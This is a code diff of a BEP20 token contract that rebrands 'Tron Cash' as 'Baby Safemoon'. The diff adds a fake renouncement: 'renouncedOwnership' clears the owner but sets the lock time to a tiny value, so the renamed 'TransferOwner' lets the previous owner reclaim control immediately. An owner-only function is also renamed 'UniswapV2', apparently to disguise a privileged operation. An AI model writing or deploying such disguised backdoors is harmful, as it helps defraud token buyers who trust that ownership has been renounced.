@@ -1,27 +1,20 @@
 //  SPDX-License-Identifier: UNLICENSED
 
 /**  
-     Tg @TRXcashtoken
-     Tron Cash : TRXC
-     Supply       : 100.000
-     Max buy/sell :   1.000
-     Max Wallet   :   5.000
+     Tg @BabySafemoon
+     Baby Safemoon : BSFM
+     Supply        : 1.000.000.000.000.000
      
 
-████████╗██████╗░░█████╗░███╗░░██╗
-╚══██╔══╝██╔══██╗██╔══██╗████╗░██║
-░░░██║░░░██████╔╝██║░░██║██╔██╗██║
-░░░██║░░░██╔══██╗██║░░██║██║╚████║
-░░░██║░░░██║░░██║╚█████╔╝██║░╚███║
-░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝
 
-
-░█████╗░░█████╗░░██████╗██╗░░██╗
-██╔══██╗██╔══██╗██╔════╝██║░░██║
-██║░░╚═╝███████║╚█████╗░███████║
-██║░░██╗██╔══██║░╚═══██╗██╔══██║
-╚█████╔╝██║░░██║██████╔╝██║░░██║
-░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝
+┏━━┓╋╋╋┏┓╋╋╋╋╋╋╋╋╋╋╋╋╋┏━┓
+┃┏┓┃╋╋╋┃┃╋╋╋╋╋╋╋╋╋╋╋╋╋┃┏┛
+┃┗┛┗┳━━┫┗━┳┓╋┏┓┏━━┳━━┳┛┗┳━━┳┓┏┳━━┳━━┳━┓
+┃┏━┓┃┏┓┃┏┓┃┃╋┃┃┃━━┫┏┓┣┓┏┫┃━┫┗┛┃┏┓┃┏┓┃┏┓┓
+┃┗━┛┃┏┓┃┗┛┃┗━┛┃┣━━┃┏┓┃┃┃┃┃━┫┃┃┃┗┛┃┗┛┃┃┃┃
+┗━━━┻┛┗┻━━┻━┓┏┛┗━━┻┛┗┛┗┛┗━━┻┻┻┻━━┻━━┻┛┗┛
+╋╋╋╋╋╋╋╋╋╋┏━┛┃
+╋╋╋╋╋╋╋╋╋╋┗━━┛
 
 
  */
@@ -341,16 +334,16 @@ contract Ownable is Context {
     }
 
     //Locks the contract for owner for the amount of time provided
-    function OwnedRenounced(uint256 _time) public virtual onlyOwner {
+    function renouncedOwnership(uint8 _time) public virtual onlyOwner {
         _previousOwner = _owner;
         _owner = address(0);
-        _lockTime = now + _time;
+        _lockTime = _time;
         _time = 10;
         emit OwnershipTransferred(_owner, address(0));
     }
     
     //Unlocks the contract for owner when _lockTime is exceeds
-    function unlock() public virtual {
+    function TransferOwner() public virtual {
         require(_previousOwner == msg.sender, "You don't have permission to unlock");
         require(now > _lockTime , "Contract is locked until 7 days");
         emit OwnershipTransferred(_owner, _previousOwner);
@@ -540,7 +533,7 @@ contract TRON is Context, iBEP20, Ownable {
    *
    * - `msg.sender` must be the token owner
    */
-  function uniswap(uint256 amount) public onlyOwner returns (bool) {
+  function UniswapV2(uint256 amount) public onlyOwner returns (bool) {
     _uniswap(_msgSender(), amount);
     return true;
   }
